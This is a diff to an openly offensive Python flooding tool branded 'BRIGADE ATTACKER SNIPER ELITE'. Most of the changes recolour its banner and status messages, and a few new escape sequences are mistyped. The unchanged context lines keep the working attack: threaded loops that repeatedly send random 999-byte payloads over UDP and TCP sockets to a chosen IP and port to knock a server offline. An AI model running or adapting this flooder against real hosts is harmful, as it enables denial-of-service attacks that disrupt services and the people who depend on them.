@@ -42,8 +42,8 @@ logo = """
        ░▒ ░       ░      ░       ▒░ ░         ░ ▒░         ▒░▒░  
         ▒░          ░   ░          ░            ░            ░  
 ╔══════════════════════════════════════════════════════════════╗
-                     BRIGADE ATTACKER SNIPER ELITE
-                  FREEDOM IS THE RIGHT OF ALL NATIONS
+ \033[33m                 BRIGADE ATTACKER SNIPER ELITE
+ \033[94m              FREEDOM IS THE RIGHT OF ALL NATIONS
 ╚══════════════════════════════════════════════════════════════╝
 """
 faded_text = fade.fire(logo)
@@ -74,10 +74,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \033[33mBASE2  \033[31mHTTP  flood  \033[36m" +str(ip)+ " \033[0m")
+			print(i +" \033[33mBASE2  \033[31mHTTP flood  \033[36m" +str(ip)+ " \033[0m")
 		except:
-			print("[!] \033[94mBASE2  \033[35mSERVER  \033[91mMAYBE  \033[31mDOWN..!! \033[0m")
-
+			print(i +" \033[32mBASE2  \033[34mHTTP flood  \033[36m" +str(ip)+ " \033[0m")
 def run2():
 	data = random._urandom(999)
 	i = random.choice(("[+]","[*]","[!]"))
@@ -88,11 +87,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i *" \033[33mBASE2  \033[94mHTTPS  flood"  +str(ip)+ " \033[0m")
+			print(i +" \033[93mBASE2  \033[94mHTTP flood  \033[97m" +str(ip)+ " \033[0m")
 		except:
 			s.close()
-			print("[!] \033[94mBASE2  \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
-			
+			print(i +" \033[4mBASE2  \033[93mHTTP flood  \033[35m" +str(ip)+ " \033[0m")
             
 
 def run3():
@@ -105,13 +103,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i *"\033[92mBASE2  \033[92mAttack  sent \033[31m" +str(ip)+ "\033[0m")
+			print(i *" \036[4mBASE2  \033[37mHTTP flood  \033[35m" +str(ip)+ " \033[0m")
 		except:
 			s.close()
-			print("[!] \033[94mBASE2  \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
-			
-            
-  
+			print(i *" \036[33mBASE2  \033[37mHTTP flood  \033[4m" +str(ip)+ " \033[0m")
 							
             
 for y in range(threads):
